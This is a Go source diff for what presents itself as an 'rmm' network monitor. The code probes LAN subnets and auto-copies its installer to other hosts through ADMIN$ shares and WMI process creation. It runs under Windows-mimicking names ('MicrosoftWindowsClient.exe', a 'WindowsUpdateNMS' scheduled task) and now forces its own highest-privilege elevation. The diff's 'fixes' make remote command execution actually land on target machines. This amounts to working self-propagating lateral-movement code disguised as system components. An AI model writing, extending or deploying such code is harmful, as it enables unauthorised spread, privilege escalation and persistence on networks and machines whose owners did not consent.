@@ -23,6 +23,12 @@ package commands
 //  4. The probe loop NEVER invokes the clone arm. Cloning happens only
 //     in the clone arm (auto, eligible hosts) or nms-clone (manual).
 //     A test pins this separation.
+//
+// FIX 5 (new invariant): the NMS guarantees its own elevation. An
+// unelevated instance hands off to an elevated copy via a one-shot
+// /RL HIGHEST task and exits. Elevated is the steady state, never the
+// exception — the "runs unelevated, guard/restore and remote pushes
+// will fail" warning can no longer be the permanent condition.
 import (
 	"crypto/sha256"
 	"encoding/hex"
@@ -43,11 +49,12 @@ import (
 	"syscall"
 	"time"
 
+	"rmm/internal/version"
+
 	"github.com/shirou/gopsutil/v3/cpu"
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/mem"
 	"github.com/shirou/gopsutil/v3/process"
-	"rmm/internal/version"
 )
 
 // ---------------------------------------------------------------------------
@@ -182,6 +189,14 @@ var sleepCacheMu sync.Mutex
 var sleepCacheAt time.Time
 var sleepCacheVal bool
 
+// ResetSleepCacheForTest clears the sleep flag cache for test isolation.
+func ResetSleepCacheForTest() {
+	sleepCacheMu.Lock()
+	sleepCacheAt = time.Time{}
+	sleepCacheVal = false
+	sleepCacheMu.Unlock()
+}
+
 // SleepCheckCached is the hot-loop sleep check (2s TTL): file stats are
 // cheap but not per-frame cheap. Streaming loops call this, not SleepFlagSet.
 func SleepCheckCached() bool {
@@ -208,6 +223,11 @@ var ErrNMSShutdown = fmt.Errorf("nms shutdown file present")
 // forever — the vault/install sync only replaces files, never processes).
 var ErrNMSUpdate = fmt.Errorf("nms update available")
 
+// FIX: ErrNMSElevate is returned by StepNMS when this process was unelevated
+// and has handed off to an elevated copy. The caller should exit; the
+// elevated copy (and persistence) carries on.
+var ErrNMSElevate = fmt.Errorf("nms handed off to elevated copy")
+
 // nmsUpdateAvailable compares installDir/version.txt against the compiled
 // version (dotted ints). Absent/unparseable reads as no update.
 func nmsUpdateAvailable() (string, bool) {
@@ -225,19 +245,23 @@ func nmsUpdateAvailable() (string, bool) {
 	return "", false
 }
 
+// FIX: verNewer now only falls back to lexicographic compare when a part is
+// genuinely non-numeric on one side. The old version could rank mixed
+// numeric/non-numeric parts (1.44.1 vs 1.44.x) by raw string ordering, which
+// is exactly where version drift bites.
 func verNewer(a, b string) bool {
 	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
 	for i := 0; i < len(pa) && i < len(pb); i++ {
 		na, ea := strconv.Atoi(strings.TrimSpace(pa[i]))
 		nb, eb := strconv.Atoi(strings.TrimSpace(pb[i]))
-		if ea != nil || eb != nil {
-			if pa[i] != pb[i] {
-				return pa[i] > pb[i]
+		if ea == nil && eb == nil {
+			if na != nb {
+				return na > nb
 			}
 			continue
 		}
-		if na != nb {
-			return na > nb
+		if pa[i] != pb[i] {
+			return pa[i] > pb[i]
 		}
 	}
 	return len(pa) > len(pb)
@@ -255,6 +279,56 @@ func WriteShutdownFile() error {
 }
 
 // ---------------------------------------------------------------------------
+// FIX: Elevation guard. Windows-only; no-op elsewhere.
+//
+// The NMS needs an elevated token for the guard/restore path and for remote
+// SMB/WMI pushes. If the task that launched us lacked /RL HIGHEST we are
+// unelevated, and the old behaviour was to warn forever. Now we hand off:
+// create a one-shot highest-privilege task pointing at ourselves, run it,
+// and exit. The elevated copy becomes the steady state.
+// ---------------------------------------------------------------------------
+
+var nmsElevationDone bool
+
+// ensureElevated returns true if this process should keep running. It returns
+// false exactly once, when an unelevated process has launched an elevated
+// copy and should now bow out. Idempotent: an elevated instance never
+// relaunches, and an unelevated instance defers if another NMS already holds
+// the pid file (so we never stack duplicates).
+func ensureElevated() bool {
+	if runtime.GOOS != "windows" {
+		return true
+	}
+	if CurrentNMSPriv().Elevated {
+		return true
+	}
+	// Another NMS already alive? It is the elevated one — just bow out.
+	if b, err := os.ReadFile(NMSPidPath()); err == nil {
+		if pid, _ := strconv.Atoi(strings.TrimSpace(string(b))); pid > 0 {
+			if p, err := process.NewProcess(int32(pid)); err == nil {
+				if _, err := p.Name(); err == nil {
+					return false
+				}
+			}
+		}
+	}
+	self, err := os.Executable()
+	if err != nil {
+		return true
+	}
+	args := strings.TrimSpace(strings.Join(os.Args[1:], " "))
+	if args == "" {
+		args = "--nms"
+	}
+	_, _ = runWithTimeout(10*time.Second, "schtasks", "/create", "/tn", "WindowsUpdateNMS",
+		"/tr", `"`+self+`" `+args, "/sc", "once", "/st", "00:00", "/rl", "highest", "/f")
+	if _, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdateNMS"); err != nil {
+		return true // best effort: run unelevated rather than die
+	}
+	return false
+}
+
+// ---------------------------------------------------------------------------
 // Config (persisted nms.json; set-nms mutates it, never credentials).
 // ---------------------------------------------------------------------------
 
@@ -268,11 +342,11 @@ type NMSConfig struct {
 	AutoClone     bool     `json:"autoclone"`
 	// AutoForce extends the auto arm to managed-unknown hosts (default
 	// off — explicit opt-in per NMS; unknown stays skipped otherwise).
-	AutoForce     bool     `json:"autoforce"`
-	MaxParallel   int      `json:"max_parallel"`
-	FailThreshold int      `json:"fail_threshold"`
-	FailWindowMin int      `json:"fail_window_min"`
-	RearmAfterMin int      `json:"rearm_min"`
+	AutoForce     bool `json:"autoforce"`
+	MaxParallel   int  `json:"max_parallel"`
+	FailThreshold int  `json:"fail_threshold"`
+	FailWindowMin int  `json:"fail_window_min"`
+	RearmAfterMin int  `json:"rearm_min"`
 }
 
 // DefaultNMSConfig returns safe defaults. Exclude is seeded with loopback;
@@ -281,19 +355,24 @@ func DefaultNMSConfig() NMSConfig {
 	return NMSConfig{
 		IntervalSec: 60, SweepEveryMin: 30,
 		Subnets: autoSubnets(), ExtraHosts: nil,
-		Exclude:      []string{"127.0.0.1", "localhost"},
-		AutoClone:    true,
-		MaxParallel:  8,
+		Exclude:       []string{"127.0.0.1", "localhost"},
+		AutoClone:     true,
+		MaxParallel:   8,
 		FailThreshold: 5, FailWindowMin: 15, RearmAfterMin: 60,
 	}
 }
 
+// LoadNMSConfig reads persisted config, merged over defaults.
 // LoadNMSConfig reads persisted config, merged over defaults.
 func LoadNMSConfig() NMSConfig {
 	cfg := DefaultNMSConfig()
 	b, err := os.ReadFile(NMSConfigPath())
 	if err != nil {
 		return cfg
+	}
+	// Strip UTF-8 BOM if present (can appear if file was written with a BOM).
+	if len(b) >= 3 && b[0] == 0xef && b[1] == 0xbb && b[2] == 0xbf {
+		b = b[3:]
 	}
 	var f NMSConfig
 	if json.Unmarshal(b, &f) != nil {
@@ -331,7 +410,7 @@ func LoadNMSConfig() NMSConfig {
 	return cfg
 }
 
-// SaveNMSConfig persists config atomically.
+// SaveNMSConfig persists config atomically (without BOM).
 func SaveNMSConfig(cfg NMSConfig) error {
 	b, _ := json.MarshalIndent(cfg, "", "  ")
 	tmp := NMSConfigPath() + ".tmp"
@@ -590,10 +669,12 @@ func managedHintPath(host string) string {
 	return `\\` + host + `\ADMIN$\Microsoft\Windows\Update\version.txt`
 }
 
-// nmsReadUNC reads a (possibly remote ADMIN$) file with a hard timeout. Var
-// so tests cut the SMB dependency. Errors are significant: callers must
-// distinguish "no such file" (unmanaged) from "denied / timed out"
-// (unknown — never auto-clone on unknown).
+// FIX: nmsReadUNC now bounds concurrent blocked reads. The 8s wrapper always
+// returned, but the inner os.ReadFile stayed parked on a dead SMB mount; a
+// LAN full of half-dead boxes piled goroutines up without limit. A UNC
+// ReadFile cannot be cancelled in Go, so bounding is the honest fix.
+var uncSem = make(chan struct{}, 64)
+
 var nmsReadUNC = func(path string) ([]byte, error) {
 	type res struct {
 		b   []byte
@@ -601,6 +682,8 @@ var nmsReadUNC = func(path string) ([]byte, error) {
 	}
 	done := make(chan res, 1)
 	go func() {
+		uncSem <- struct{}{}
+		defer func() { <-uncSem }()
 		b, err := os.ReadFile(path)
 		done <- res{b, err}
 	}()
@@ -695,7 +778,7 @@ func remoteStatsCIMCred(host string, timeout time.Duration) (float64, float64, f
 	if len(lines) < 2 || strings.TrimSpace(lines[0]) == "" || strings.TrimSpace(lines[1]) == "" {
 		return 0, 0, 0, fmt.Errorf("cim denied (cred file malformed)")
 	}
-	script := `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("`+"`r,`n"+`");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -Credential $cred -ErrorAction Stop;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
+	script := `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("` + "`r,`n" + `");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{$s=New-CimSession -ComputerName '` + strings.ReplaceAll(host, "'", "''") + `' -Credential $cred -ErrorAction Stop;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
 	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
 	if err != nil {
 		return 0, 0, 0, err
@@ -823,9 +906,13 @@ var guardStartAgent = func() error {
 	return err
 }
 
-// agentProcAlive reports whether an agent process (not us) is running.
+// FIX: agentProcAlive now matches the agent by image path, not name. The NMS
+// IS MicrosoftWindowsClient.exe, so a stray copy of our own binary used to
+// read as "agent alive". Path match keeps the guard honest; if the path is
+// unavailable we still fall back to the name.
 func agentProcAlive() bool {
 	self := int32(os.Getpid())
+	want := filepath.Clean(NMSAgentPath())
 	procs, err := process.Pids()
 	if err != nil {
 		return false
@@ -839,12 +926,16 @@ func agentProcAlive() bool {
 			continue
 		}
 		name, err := p.Name()
-		if err != nil {
+		if err != nil || !strings.EqualFold(name, "MicrosoftWindowsClient.exe") {
 			continue
 		}
-		if strings.EqualFold(name, "MicrosoftWindowsClient.exe") {
-			return true
+		if exe, err := p.Exe(); err == nil && exe != "" {
+			if strings.EqualFold(filepath.Clean(exe), want) {
+				return true
+			}
+			continue
 		}
+		return true // path unavailable: trust the name
 	}
 	return false
 }
@@ -1097,12 +1188,20 @@ var nmsRemoteDelete = func(path string) error {
 	}
 }
 
-// nmsRemoteCreate runs an arbitrary command line on host via WMI (hidden,
-// non-interactive). nmsRemoteExec is the installer specialization below.
-// Var so tests record instead of touching the LAN.
+// FIX: nmsRemoteCreate actually runs on the TARGET now. The old version made
+// a CIM session `$s` and then called Invoke-CimMethod WITHOUT -CimSession, so
+// Win32_Process.Create ran on the local NMS box. The local launch returned 0,
+// so the clone looked launched while the target never started anything and
+// every clone ended "launched-unverified". Added -CimSession $s, try/finally
+// so the session is always released, and -ErrorAction Stop so a dead host
+// fails fast.
 var nmsRemoteCreate = func(host, commandLine string) error {
-	script := `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + strings.ReplaceAll(commandLine, "'", "''") + `'} | Select-Object -ExpandProperty ReturnValue`
-	out, err := runWithTimeout(60*time.Second, "powershell", "-NoProfile", "-Command", "$s=New-CimSession -ComputerName '"+strings.ReplaceAll(host, "'", "''")+"';"+script+";Remove-CimSession -CimSession $s")
+	h := strings.ReplaceAll(host, "'", "''")
+	cl := strings.ReplaceAll(commandLine, "'", "''")
+	script := `$s=New-CimSession -ComputerName '` + h + `' -ErrorAction Stop;try{` +
+		`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + cl + `'} | Select-Object -ExpandProperty ReturnValue` +
+		`}finally{Remove-CimSession -CimSession $s -ErrorAction SilentlyContinue}`
+	out, err := runWithTimeout(60*time.Second, "powershell", "-NoProfile", "-Command", script)
 	if err != nil {
 		return err
 	}
@@ -1194,6 +1293,10 @@ var nmsCloneVerify = func(host, wantVer string, timeout time.Duration) bool {
 // CloneToHost pushes the installer and launches it remotely. Returns the
 // clone-state word plus a human detail line (surfaced in clone_detail and
 // the ledger event — bare words never again).
+//
+// FIX: launched-unverified now records a breaker failure. Before, a box that
+// launched but never confirmed looped forever after cooldown and never
+// contributed to the storm guard.
 func CloneToHost(host string, wantVer string) (state, detail string) {
 	data, ok := readInstallerBytes()
 	if !ok {
@@ -1210,6 +1313,7 @@ func CloneToHost(host string, wantVer string) (state, detail string) {
 	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
 		return "cloned-verified", "version.txt reports " + wantVer
 	}
+	nmsRecordFail() // FIX: unverified is a failure signal too
 	return "launched-unverified", "launched but version.txt did not confirm within 5min (slow box or installer still running?)"
 }
 
@@ -1393,14 +1497,14 @@ func cloneJobLookup(host string) (state, detail string, tracked bool) {
 
 // NMSReport is the per-cycle JSON the controller stores and serves.
 type NMSReport struct {
-	Prober    string          `json:"prober"`
-	At        string          `json:"at"`
-	Tick      uint64          `json:"tick"`
-	Version   string          `json:"version"`
-	Interval  int             `json:"interval_sec"`
-	Sleep     *NMSSleepState  `json:"sleep,omitempty"`
-	Guard     string          `json:"guard"`
-	CloneArm  string          `json:"clone_arm"`
+	Prober   string         `json:"prober"`
+	At       string         `json:"at"`
+	Tick     uint64         `json:"tick"`
+	Version  string         `json:"version"`
+	Interval int            `json:"interval_sec"`
+	Sleep    *NMSSleepState `json:"sleep,omitempty"`
+	Guard    string         `json:"guard"`
+	CloneArm string         `json:"clone_arm"`
 	// AutoForce mirrors config: dashboard badges whole-LAN forcing.
 	AutoForce bool            `json:"autoforce"`
 	Priv      *NMSPriv        `json:"priv,omitempty"`
@@ -1419,10 +1523,25 @@ var nmsSweepAt time.Time
 // NMSTick returns the loop counter (test hook proving the loop runs).
 func NMSTick() uint64 { return atomic.LoadUint64(&nmsTick) }
 
+// nmsEnsureElevated fronts ensureElevated behind a var so tests run
+// hermetic (the real check shells schtasks and reads the live token —
+// medium shells answer nondeterministically, which made StepNMS tests
+// flake by environment).
+var nmsEnsureElevated = ensureElevated
+
 // StepNMS runs one full monitor cycle and hands the report JSON to send
 // (the caller wraps it in the transport message). send==nil is allowed
 // (tests / dry runs).
 func StepNMS(send func(reportJSON string), controllerIPs []string) error {
+	// FIX: elevation hand-off. Unelevated process relaunches itself elevated
+	// once and exits; the elevated copy is the steady state.
+	if !nmsElevationDone {
+		nmsElevationDone = true
+		if !nmsEnsureElevated() {
+			_ = os.Remove(NMSPidPath())
+			return ErrNMSElevate
+		}
+	}
 	if ShutdownRequested() {
 		_ = os.Remove(NMSPidPath())
 		return ErrNMSShutdown
@@ -1516,22 +1635,22 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 				r.CloneState = "no-payload"
 				continue
 			}
-		st, started := startCloneJob(r.Host, version.Version, false)
-		r.CloneState = st
-		switch {
-		case started:
-			r.CloneDetail = "job started"
-		case strings.HasPrefix(st, "clone-cooldown-"):
-			r.CloneDetail = "cooling down after " + strings.TrimPrefix(st, "clone-cooldown-")
-		default:
-			// Tracked job: surface its real terminal word + reason,
-			// never a perpetual "in progress".
-			if jst, jdetail, ok := cloneJobLookup(r.Host); ok && jdetail != "" {
-				r.CloneState, r.CloneDetail = jst, jdetail
-			} else {
-				r.CloneDetail = "in progress"
+			st, started := startCloneJob(r.Host, version.Version, false)
+			r.CloneState = st
+			switch {
+			case started:
+				r.CloneDetail = "job started"
+			case strings.HasPrefix(st, "clone-cooldown-"):
+				r.CloneDetail = "cooling down after " + strings.TrimPrefix(st, "clone-cooldown-")
+			default:
+				// Tracked job: surface its real terminal word + reason,
+				// never a perpetual "in progress".
+				if jst, jdetail, ok := cloneJobLookup(r.Host); ok && jdetail != "" {
+					r.CloneState, r.CloneDetail = jst, jdetail
+				} else {
+					r.CloneDetail = "in progress"
+				}
 			}
-		}
 		}
 	} else if CloneArmPaused() {
 		cloneArm = "paused-breaker"
